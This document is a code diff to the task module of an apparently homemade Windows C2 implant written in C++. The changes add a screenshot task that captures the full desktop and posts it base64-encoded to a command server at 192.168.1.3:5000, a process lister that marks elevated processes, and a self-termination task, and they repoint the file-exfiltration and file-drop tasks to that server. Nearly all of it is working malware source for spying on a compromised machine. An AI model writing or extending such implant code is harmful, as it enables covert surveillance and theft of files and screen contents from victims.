@@ -3,19 +3,18 @@
 #endif
 
 #include "tasks.h"
-
-#include <string>
-#include <array>
-#include <sstream>
-#include <fstream>
-#include <cstdlib>
+#include "base64.h"
 
 #include <cpr/cpr.h>
+#include <nlohmann/json.hpp>
 #include <boost/property_tree/ptree.hpp>
 
 #include <Windows.h>
 #include <tlhelp32.h>
+#include <Shlwapi.h>
+#include <GdiPlus.h>
 
+using json = nlohmann::json;
 
 extern std::string ids;
 // Function to parse the tasks from the property tree returned by the listening post
@@ -59,6 +58,11 @@ extern std::string ids;
             ids
         };
     }
+    if (taskType == KillBeaconProcess::key && idString == ids) {
+        return KillBeaconProcess{
+            ids
+        };
+    }
     if (taskType == DownloadFileTask::key && idString == ids) {
         return DownloadFileTask{
             ids,
@@ -71,6 +75,11 @@ extern std::string ids;
             taskTree.get_child("file").get_value<std::string>()
         };
     }
+    if (taskType == ScreenshotTask::key && idString == ids) {
+        return ScreenshotTask{
+            ids
+        };
+    }
 
     // ===========================================================================================
 
@@ -78,6 +87,25 @@ extern std::string ids;
     std::string errorMsg{ "Illegal task type encountered: " };
     errorMsg.append(taskType);
     throw std::logic_error{ errorMsg };
+}
+
+BOOL IsRunasAdmin(HANDLE hProcess) // Check what process is running in Elevated context (We Need To Be Administrator First)
+{
+    BOOL bElevated = FALSE;
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
+        return FALSE;
+    TOKEN_ELEVATION tokenEle;
+    DWORD dwRetLen = 0;
+    if (GetTokenInformation(hToken, TokenElevation, &tokenEle, sizeof(tokenEle), &dwRetLen))
+    {
+        if (dwRetLen == sizeof(tokenEle))
+        {
+            bElevated = tokenEle.TokenIsElevated;
+        }
+    }
+    CloseHandle(hToken);
+    return bElevated;
 }
 
 // Instantiate the implant configuration
@@ -208,6 +236,23 @@ Result ListThreadsTask::run() const {
     }
 }
 
+// KillBeaconProcess
+// -------------------------------------------------------------------------------------------
+KillBeaconProcess::KillBeaconProcess(const std::string& id)
+    : id{ id } {}
+
+Result KillBeaconProcess::run() const {
+    try {
+        DWORD pid = GetCurrentProcessId();
+        HANDLE hProcess;
+        hProcess = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, pid);
+        TerminateProcess(hProcess, 0);
+    }
+    catch (const std::exception& e) {
+        return Result{ id, e.what(), false };
+    }
+}
+
 // ListRunningProcesses
 // -------------------------------------------------------------------------------------------
 ListRunningProcesses::ListRunningProcesses(const std::string& id)
@@ -217,8 +262,9 @@ Result ListRunningProcesses::run() const {
     try {
         std::stringstream processList;
 
-        HANDLE hProcessSnap;
+        HANDLE hProcessSnap, hProcess;
         PROCESSENTRY32 pe32;
+        BOOL bRunAsAdmin;
 
         // Take a snapshot of all processes in the system.
         hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -240,14 +286,29 @@ Result ListRunningProcesses::run() const {
 
         // Now walk the snapshot of processes, and
         // display information about each process in turn
+        std::string processIsAdmin;
+        processList
+            << "=========================================\n";
         do
         {
             // STUPID CONVERSION FROM WCHAR TO ASCII STRING!!!!
             std::wstring ws(pe32.szExeFile);
             std::string process_name(ws.begin(), ws.end());
-            processList << "Process: |" << process_name << "|\tPID: |" << pe32.th32ProcessID << "|\n";
+            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+            bRunAsAdmin = IsRunasAdmin(hProcess);
+            if (bRunAsAdmin)
+                processIsAdmin = "Yes";
+            else
+                processIsAdmin = "?";
+
+            processList
+                << "[+] Process-Name:  " << process_name
+                << "    PID: " << pe32.th32ProcessID
+                << "    Elevated:  " << processIsAdmin << "\n";
 
         } while (Process32NextW(hProcessSnap, &pe32));
+
+        processList << "=========================================\n";
  
         CloseHandle(hProcessSnap);
         return Result{ id, processList.str(), true };
@@ -271,7 +332,7 @@ Result DownloadFileTask::run() const {
         std::string base_filename = path.substr(path.find_last_of("/\\") + 1);
 
         std::stringstream ss;
-        ss << "http://192.168.1.6:5000/files/" << base_filename;
+        ss << "http://192.168.1.3:5000/files/" << base_filename;
         std::string fullServerUrl = ss.str();
         cpr::Response r = cpr::Post(cpr::Url{ fullServerUrl }, cpr::Multipart{ {"Filedata", cpr::File{filepath}}});
 
@@ -298,7 +359,7 @@ Result UploadFileTask::run() const {
 
     std::ofstream of(filename, std::ios::binary);
     std::stringstream ss;
-    ss << "http://192.168.1.6:5000/files/" << filename;
+    ss << "http://192.168.1.3:5000/files/" << filename;
     std::string fullServerUrl = ss.str();
     cpr::Response r = cpr::Download(of, cpr::Url{ fullServerUrl });
     if (r.status_code == 200) { // checks if the file has been downloaded successfully by the implant
@@ -306,5 +367,99 @@ Result UploadFileTask::run() const {
     }
     else {
         return Result{ id, "File Upload Failed!", false };
+    }
+}
+
+// ScreenshotTask (Takes screenshot and sends it to the C2 server)
+// -------------------------------------------------------------------------------------------
+ScreenshotTask::ScreenshotTask(const std::string& id)
+    : id{ id } {}
+
+Result ScreenshotTask::run() const {
+    BITMAPFILEHEADER bfHeader;
+    BITMAPINFOHEADER biHeader;
+    BITMAPINFO bInfo;
+    HGDIOBJ hTempBitmap;
+    HBITMAP hBitmap;
+    BITMAP bAllDesktops;
+    HDC hDC, hMemDC;
+    LONG lWidth, lHeight;
+    BYTE* bBits = NULL;
+    HANDLE hHeap = GetProcessHeap();
+    DWORD cbBits, dwWritten = 0;
+    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
+    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
+    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
+
+    hDC = GetDC(NULL);
+    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
+    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
+
+    lWidth = bAllDesktops.bmWidth;
+    lHeight = bAllDesktops.bmHeight;
+
+    DeleteObject(hTempBitmap);
+
+    bfHeader.bfType = (WORD)('B' | ('M' << 8));
+    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    biHeader.biSize = sizeof(BITMAPINFOHEADER);
+    biHeader.biBitCount = 24;
+    biHeader.biCompression = BI_RGB;
+    biHeader.biPlanes = 1;
+    biHeader.biWidth = lWidth;
+    biHeader.biHeight = lHeight;
+
+    bInfo.bmiHeader = biHeader;
+
+    cbBits = (((24 * lWidth + 31) & ~31) / 8) * lHeight;
+
+    hMemDC = CreateCompatibleDC(hDC);
+    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID**)&bBits, NULL, 0);
+    SelectObject(hMemDC, hBitmap);
+    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
+
+    DeleteDC(hMemDC);
+    ReleaseDC(NULL, hDC);
+
+    std::vector<BYTE> buf;
+    IStream* stream = NULL;
+    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
+    CImage image;
+    ULARGE_INTEGER liSize;
+
+    image.Attach(hBitmap);
+    image.Save(stream, Gdiplus::ImageFormatJPEG); // Save image to stream
+    IStream_Size(stream, &liSize);
+    DWORD len = liSize.LowPart;
+    IStream_Reset(stream);
+    buf.resize(len);
+    IStream_Read(stream, &buf[0], len);
+    stream->Release();
+
+    std::string file = base64_encode(std::string(buf.begin(), buf.end()));
+
+    std::stringstream ss;
+    ss << "http://192.168.1.3:5000/screenshots";
+    std::string fullServerUrl = ss.str();
+
+    json bodyrequest;
+    bodyrequest["Image"] = file;
+
+    DeleteObject(hBitmap);
+
+    cpr::Response r = cpr::Post(cpr::Url{ fullServerUrl },
+        cpr::Body{ bodyrequest.dump() },
+        cpr::Header{ {"Content-Type", "application/json"} }
+    );
+
+    if (r.status_code == 200) { // checks if the request has return 200
+        return Result{ id, "Screenshot Successful!", true };
+    }
+    else {
+        return Result{ id, "Screenshot Failed!", false };
     }
 }
